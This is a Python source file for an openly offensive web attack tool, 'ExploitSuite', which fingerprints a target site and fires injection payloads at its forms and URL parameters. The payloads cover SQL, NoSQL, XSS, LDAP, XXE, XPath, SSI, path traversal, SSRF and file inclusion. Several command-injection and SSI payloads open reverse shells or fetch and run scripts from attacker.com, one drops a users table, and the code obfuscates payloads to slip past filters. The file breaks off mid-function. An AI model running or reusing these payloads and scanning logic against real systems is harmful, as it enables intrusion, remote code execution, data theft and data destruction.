#!/usr/bin/env python3
import requests
import argparse
import json
import time
import random
import string
import re
import urllib.parse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import warnings
warnings.filterwarnings("ignore")
import hashlib
import base64
import struct
import socket
import ssl
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

init(autoreset=True)

class ExploitSuite:
    def __init__(self, target_url, output_file=None, delay=0.5, user_agent=None, cookie=None, proxy=None):
        self.target_url = target_url
        self.output_file = output_file
        self.delay = delay
        self.session = requests.Session()
        self.results = {
            "target": target_url,
            "vulnerabilities": []
        }
        
        headers = {
            "User-Agent": user_agent if user_agent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        if cookie:
            headers["Cookie"] = cookie
        self.session.headers.update(headers)
        
        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }
        
        # Real exploit payloads
        self.payloads = {
            "sql": [
                "' OR SLEEP(5)--",
                "' UNION SELECT NULL,username,password FROM users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                "' OR 1=1--",
                "'; DROP TABLE users--"
            ],
            "blind_sql": [
                "' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--",
                "' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>97,SLEEP(5),0)--"
            ],
            "nosql": [
                "' || '1'=='1",
                "'; return true; var x='",
                "{'$gt': ''}",
                "{'$where': 'sleep(5000)'}"
            ],
            "xss": [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "<svg onload=alert(document.domain)>",
                "javascript:alert(document.cookie)"
            ],
            "command": [
                "; nc -e /bin/bash 127.0.0.1 4444 #",
                "| wget http://attacker.com/shell.php -O /var/www/html/shell.php",
                "`curl http://attacker.com/backdoor.sh|bash`",
                "$(wget http://attacker.com/shell.txt -O /tmp/sh.sh; chmod +x /tmp/sh.sh; /tmp/sh.sh)"
            ],
            "ldap": [
                "*)(&",
                "*)(uid=*))(|(password=*)",
                "*)%00"
            ],
            "xxe": [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><replace>&xxe;</replace>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com:80/file\">]><foo>&xxe;</foo>"
            ],
            "xpath": [
                "' or '1'='1",
                "'] | //user[position()=1] | //*[text()='",
                "count(//user[position()=1]/password[text()=])"
            ],
            "ssi": [
                "<!--#exec cmd=\"nc -e /bin/bash 127.0.0.1 4444\" -->",
                "<!--#include virtual=\"/etc/passwd\"-->",
                "<!--#exec cmd=\"wget http://attacker.com/shell.php -O /var/www/html/shell.php\" -->"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "/var/www/html/../../../etc/passwd"
            ],
            "ssrf": [
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "gopher://127.0.0.1:6379/_FLUSHALL",
                "file:///etc/passwd"
            ],
            "rfi": [
                "http://attacker.com/shell.txt",
                "https://attacker.com/shell.txt",
                "ftp://attacker.com/shell.txt"
            ],
            "lfi": [
                "/etc/passwd",
                "/proc/self/environ",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            "jwt_none": [
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VySWQiOiIxMjM0In0.",
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiIxMjM0In0."
            ],
            "xml_bomb": [
                """<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"""
            ]
        }
        
        self.common_params = ["id", "page", "file", "dir", "action", "cmd", "exec", "query", "search", "filter", "user", "username", "pass", "password", "email", "token", "key", "api_key", "session", "cookie"]
        
        self.security_headers = {
            "Content-Security-Policy": "Missing Content-Security-Policy header",
            "Strict-Transport-Security": "Missing Strict-Transport-Security header",
            "X-Content-Type-Options": "Missing X-Content-Type-Options header",
            "X-Frame-Options": "Missing X-Frame-Options header",
            "X-XSS-Protection": "Missing X-XSS-Protection header"
        }
        
        self.default_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "root"),
            ("root", "root"),
            ("administrator", "administrator"),
            ("admin", ""),
            ("", "admin")
        ]
        
        self.cms_signatures = {
            "WordPress": ["wp-content", "wp-includes", "wp-login.php"],
            "Joomla": ["administrator/index.php", "components/com_", "modules/mod_"],
            "Drupal": ["sites/default/", "Drupal.settings", "misc/drupal.js"],
            "Magento": ["mage/", "skin/frontend/", "app/etc/"]
        }
        
        self.backup_files = [
            "backup.zip", "backup.tar.gz", "backup.sql", "backup.bak",
            "site.zip", "site.tar.gz", "wp-config.php.bak", ".env.bak",
            "config.php.bak", "configuration.php.bak", "database.sql",
            ".git", ".svn", ".DS_Store", "web.config.bak"
        ]
        
        self.common_dirs = [
            "admin", "administrator", "login", "wp-admin", "wp-login",
            "phpmyadmin", "myadmin", "pma", "mysql", "sqladmin",
            "backup", "config", "setup", "install", "test", "dev", "staging"
        ]
        
        self.http_methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE", "HEAD", "CONNECT", "PATCH"]
        
        self.random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        self.fingerprint = self._fingerprint_target()
        
    def _fingerprint_target(self):
        fingerprint = {
            "server": None,
            "cms": None,
            "framework": None,
            "technologies": []
        }
        
        try:
            response = self.session.get(self.target_url, verify=False, timeout=10)
            
            # Server header
            if "Server" in response.headers:
                fingerprint["server"] = response.headers["Server"]
            
            # CMS detection
            content = response.text.lower()
            for cms, signatures in self.cms_signatures.items():
                for sig in signatures:
                    if sig.lower() in content:
                        fingerprint["cms"] = cms
                        break
            
            # Framework detection
            if "x-powered-by" in response.headers:
                powered_by = response.headers["x-powered-by"].lower()
                if "php" in powered_by:
                    fingerprint["technologies"].append("PHP")
                elif "asp.net" in powered_by:
                    fingerprint["technologies"].append("ASP.NET")
                elif "node.js" in powered_by:
                    fingerprint["technologies"].append("Node.js")
            
            # Check for common frameworks
            if "jquery" in content:
                fingerprint["technologies"].append("jQuery")
            if "angular" in content:
                fingerprint["technologies"].append("Angular")
            if "react" in content:
                fingerprint["technologies"].append("React")
            if "vue" in content:
                fingerprint["technologies"].append("Vue.js")
                
            return fingerprint
        except Exception as e:
            print(f"{Fore.RED}Error fingerprinting target: {str(e)}")
            return fingerprint
    
    def _random_delay(self):
        time.sleep(random.uniform(0.1, self.delay))
    
    def _obfuscate_payload(self, payload):
        # Simple obfuscation techniques
        obfuscated = payload
        
        # Replace common keywords with alternative representations
        obfuscated = obfuscated.replace("script", "scr\u0069pt")
        obfuscated = obfuscated.replace("alert", "al\u0065rt")
        obfuscated = obfuscated.replace("document", "doc\u0075ment")
        obfuscated = obfuscated.replace("cookie", "coo\u006bie")
        
        # Add random comments
        if random.choice([True, False]):
            comment = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
            obfuscated = obfuscated.replace(">", f"<!--{comment}-->")
        
        # Encode parts in different encodings
        if random.choice([True, False]):
            parts = obfuscated.split(" ")
            for i in range(len(parts)):
                if random.choice([True, False]) and len(parts[i]) > 3:
                    parts[i] = parts[i].replace(parts[i][1:-1], urllib.parse.quote(parts[i][1:-1]))
            obfuscated = " ".join(parts)
        
        return obfuscated
    
    def _get_forms(self, url):
        try:
            response = self.session.get(url, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            return forms
        except Exception as e:
            print(f"{Fore.RED}Error getting forms from {url}: {str(e)}")
            return []
    
    def _get_form_details(self, form):
        details = {}
        
        action = form.attrs.get("action", "").lower()
        if not action.startswith("http"):
            action = urllib.parse.urljoin(self.target_url, action)
        
        method = form.attrs.get("method", "get").lower()
        
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value
            })
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details
    
    def _submit_form(self, form_details, url, payload, input_name=None):
        target_url = form_details["action"]
        
        data = {}
        for input in form_details["inputs"]:
            if input["type"] == "submit" or input["type"] == "button":
                continue
            if input_name and input["name"] == input_name:
                data[input["name"]] = payload
            else:
                data[input["name"]] = input["value"]
        
        if form_details["method"] == "post":
            return self.session.post(target_url, data=data, verify=False, timeout=10)
        else:
            return self.session.get(target_url, params=data, verify=False, timeout=10)
    
    def _scan_sql_injection(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for SQL Injection vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["sql"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_sql_injection_response(response):
                        vuln = {
                            "type": "SQL Injection",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] SQL Injection found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["sql"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_sql_injection_response(response):
                        vuln = {
                            "type": "SQL Injection",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] SQL Injection found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_sql_injection_response(self, response):
        errors = [
            "you have an error in your sql syntax",
            "warning: mysql_fetch_assoc()",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "sql query failed",
            "syntax error",
            "unexpected end of sql command",
            "microsoft ole db provider for odbc drivers error",
            "ora-00936: missing expression",
            "microsoft jet database engine error"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for time-based SQLi
        if response.elapsed.total_seconds() > 5:
            return True
            
        return False
    
    def _scan_blind_sql_injection(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for Blind SQL Injection vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["blind_sql"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    start_time = time.time()
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    end_time = time.time()
                    
                    if end_time - start_time > 4:  # Time-based detection
                        vuln = {
                            "type": "Blind SQL Injection",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": f"Time delay: {end_time - start_time} seconds"
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Blind SQL Injection found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["blind_sql"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    start_time = time.time()
                    response = self.session.get(test_url, verify=False, timeout=10)
                    end_time = time.time()
                    
                    if end_time - start_time > 4:  # Time-based detection
                        vuln = {
                            "type": "Blind SQL Injection",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": f"Time delay: {end_time - start_time} seconds"
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Blind SQL Injection found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _scan_nosql_injection(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for NoSQL Injection vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["nosql"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_nosql_injection_response(response):
                        vuln = {
                            "type": "NoSQL Injection",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] NoSQL Injection found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["nosql"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_nosql_injection_response(response):
                        vuln = {
                            "type": "NoSQL Injection",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] NoSQL Injection found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_nosql_injection_response(self, response):
        errors = [
            "syntaxerror",
            "unexpected token",
            "bson",
            "mongodb",
            "error parsing",
            "invalid object",
            "casterror"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for successful authentication bypass
        if "welcome" in content.lower() or "dashboard" in content.lower() or "admin" in content.lower():
            return True
            
        return False
    
    def _scan_command_injection(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for Command Injection vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["command"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    start_time = time.time()
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    end_time = time.time()
                    
                    if self._check_command_injection_response(response, end_time - start_time):
                        vuln = {
                            "type": "Command Injection",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Command Injection found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["command"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    start_time = time.time()
                    response = self.session.get(test_url, verify=False, timeout=10)
                    end_time = time.time()
                    
                    if self._check_command_injection_response(response, end_time - start_time):
                        vuln = {
                            "type": "Command Injection",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Command Injection found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_command_injection_response(self, response, elapsed_time):
        errors = [
            "sh: command not found",
            "bash: command not found",
            "cmd.exe not found",
            "command failed",
            "syntax error"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for time-based command injection
        if elapsed_time > 4:
            return True
            
        # Check for command output
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
            
        return False
    
    def _scan_ldap_injection(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for LDAP Injection vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["ldap"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_ldap_injection_response(response):
                        vuln = {
                            "type": "LDAP Injection",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] LDAP Injection found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["ldap"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_ldap_injection_response(response):
                        vuln = {
                            "type": "LDAP Injection",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] LDAP Injection found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_ldap_injection_response(self, response):
        errors = [
            "ldap_search()",
            "ldap_bind()",
            "ldap_connect()",
            "invalid dn syntax",
            "operations error",
            "protocol error",
            "timelimit exceeded",
            "sizelimit exceeded",
            "strongauth required",
            " referral"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for successful authentication bypass
        if "welcome" in content.lower() or "dashboard" in content.lower() or "admin" in content.lower():
            return True
            
        return False
    
    def _scan_xxe_injection(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for XXE Injection vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["xxe"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_xxe_injection_response(response):
                        vuln = {
                            "type": "XXE Injection",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] XXE Injection found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["xxe"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_xxe_injection_response(response):
                        vuln = {
                            "type": "XXE Injection",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] XXE Injection found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_xxe_injection_response(self, response):
        errors = [
            "xml parsing error",
            "xml declaration allowed only at the start of the document",
            "failed to parse external entity",
            "external entity processing is disabled",
            "entity resolution not possible"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
            
        # Check for base64 encoded file content
        if "PD9waHAg" in content or "cm9vdDp4OjA6" in content:
            return True
            
        return False
    
    def _scan_xpath_injection(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for XPath Injection vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["xpath"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_xpath_injection_response(response):
                        vuln = {
                            "type": "XPath Injection",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] XPath Injection found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["xpath"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_xpath_injection_response(response):
                        vuln = {
                            "type": "XPath Injection",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] XPath Injection found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_xpath_injection_response(self, response):
        errors = [
            "xpath error",
            "xpath parsing error",
            "xpath query failed",
            "invalid xpath expression",
            "xpath syntax error"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for successful authentication bypass
        if "welcome" in content.lower() or "dashboard" in content.lower() or "admin" in content.lower():
            return True
            
        return False
    
    def _scan_ssi_injection(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for SSI Injection vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["ssi"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_ssi_injection_response(response):
                        vuln = {
                            "type": "SSI Injection",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] SSI Injection found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["ssi"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_ssi_injection_response(response):
                        vuln = {
                            "type": "SSI Injection",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] SSI Injection found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_ssi_injection_response(self, response):
        errors = [
            "[an error occurred while processing this directive]",
            "ssi error",
            "invalid ssi directive"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
            
        return False
    
    def _scan_xss(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for XSS vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["xss"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_xss_response(response, obfuscated_payload):
                        vuln = {
                            "type": "XSS",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] XSS found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["xss"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, verify=False, timeout=10)
                    
                    if self._check_xss_response(response, obfuscated_payload):
                        vuln = {
                            "type": "XSS",
                            "url": url,
                            "method": "GET",
                            "parameter": param,
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] XSS found: {param} parameter in {url}")
                        break
                    
                    self._random_delay()
    
    def _check_xss_response(self, response, payload):
        content = response.text.lower()
        
        # Check if the payload is reflected in the response
        if payload.lower() in content:
            return True
        
        # Check for common XSS patterns
        xss_patterns = [
            "<script>alert",
            "onerror=alert",
            "javascript:alert",
            "<svg onload=alert"
        ]
        
        for pattern in xss_patterns:
            if pattern in content:
                return True
                
        return False
    
    def _scan_path_traversal(self, url):
        print(f"{Fore.YELLOW}[+] Scanning for Path Traversal vulnerabilities on {url}")
        
        forms = self._get_forms(url)
        for form in forms:
            form_details = self._get_form_details(form)
            
            for input in form_details["inputs"]:
                if input["type"] == "hidden" or input["type"] == "submit":
                    continue
                
                for payload in self.payloads["path_traversal"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    response = self._submit_form(form_details, url, obfuscated_payload, input["name"])
                    
                    if self._check_path_traversal_response(response):
                        vuln = {
                            "type": "Path Traversal",
                            "url": url,
                            "method": form_details["method"],
                            "parameter": input["name"],
                            "payload": obfuscated_payload,
                            "evidence": self._get_evidence(response)
                        }
                        self.results["vulnerabilities"].append(vuln)
                        print(f"{Fore.GREEN}[!] Path Traversal found: {input['name']} parameter in {url}")
                        break
                    
                    self._random_delay()
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payloads["path_traversal"]:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param] = obfuscated_payload
